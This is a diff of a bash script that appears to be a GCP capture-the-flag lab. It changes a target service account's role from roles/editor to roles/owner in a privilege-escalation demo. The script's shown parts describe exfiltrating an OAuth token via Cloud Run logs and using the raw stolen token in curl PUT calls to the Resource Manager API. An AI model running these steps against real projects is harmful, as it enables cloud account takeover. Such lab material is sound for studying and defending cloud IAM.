@@ -14,7 +14,7 @@
 # invokes the service to trigger a fresh per-request exfil, reads the
 # exfiltrated token from Cloud Run logs, and uses the raw stolen token
 # directly against Google REST APIs (never re-impersonating via gcloud) to
-# prove it now holds target_sa's roles/editor project permissions.
+# prove it now holds target_sa's roles/owner project permissions.
 #
 # Payload mechanics: `python -c` bootstraps from the EXFIL_PAYLOAD env var.
 # gcloud's --args list splits values on commas (repeated --args flags and
@@ -144,7 +144,7 @@ for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID REGI
 done
 
 echo "Starting SA (no project role): $STARTING_SA_EMAIL"
-echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
+echo "Target SA   (roles/owner):    $TARGET_SA_EMAIL"
 echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
 echo "Region:                        $REGION"
 echo "Project:                       $PROJECT_ID"
@@ -619,15 +619,15 @@ if [ "$TOKEN_EMAIL" != "$TARGET_SA_EMAIL" ]; then
 fi
 echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"
 
-# Step 7: [EXPLOIT] Confirm editor-level write access using the raw stolen
+# Step 7: [EXPLOIT] Confirm owner-level write access using the raw stolen
 # token (project label write/restore round-trip) — not gcloud impersonation.
 # Uses the Resource Manager v1 projects.update method: a synchronous HTTP PUT
 # of the full Project resource (resourcemanager.projects.update, which
-# roles/editor includes). Note: v1 update is PUT-with-full-resource, NOT a
+# roles/owner includes). Note: v1 update is PUT-with-full-resource, NOT a
 # PATCH+updateMask — that shape belongs to the async v3 API and silently no-ops
 # against v1. Success is keyed on the HTTP status (200 = authorized, 403 =
 # denied/viewer-only), not the response body shape.
-echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
+echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/owner write access via raw stolen token${NC}"
 show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
     "curl -X PUT 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID' -H 'Authorization: Bearer <redacted>' -d '<project JSON with added label>'"
 
@@ -647,7 +647,7 @@ PUT_BODY=$(echo "$PUT_RESPONSE" | sed '$d')
 
 if [ "$PUT_CODE" = "200" ]; then
     echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
-    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+    echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
     # Restore the original labels (PUT the pre-change resource back).
     curl -s -X PUT \
         -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
@@ -711,7 +711,7 @@ echo "    -> (run.services.create + iam.serviceAccounts.actAs on target_sa — T
 echo "    -> Cloud Run service '$SERVICE_NAME' deployed and running as $TARGET_SA_EMAIL"
 echo "       (image: docker.io/library/python:3.13-slim from public Docker Hub — no Artifact Registry)"
 echo "    -> exfiltrated OAuth access token (via metadata server → Cloud Run logs)"
-echo "    -> (roles/editor on project $PROJECT_ID)"
+echo "    -> (roles/owner on project $PROJECT_ID)"
 echo "    -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
